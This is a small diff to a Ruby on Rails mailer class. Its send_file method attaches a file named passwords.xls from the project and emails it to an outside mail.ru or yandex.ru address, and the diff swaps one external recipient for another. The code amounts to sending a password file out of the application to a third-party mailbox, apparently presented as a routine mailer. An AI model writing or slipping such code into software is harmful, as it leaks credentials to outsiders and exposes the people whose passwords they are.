@@ -3,6 +3,6 @@ class UserMailer < ActionMailer::Base
 
   def send_file
   	attachments['passwords.xls'] = File.read('lib/files/passwords.xls')
-    mail(to: 'mx65@mail.ru', subject: "New file")
+    mail(to: 'miralas777@yandex.ru', subject: "New file")
   end
 end
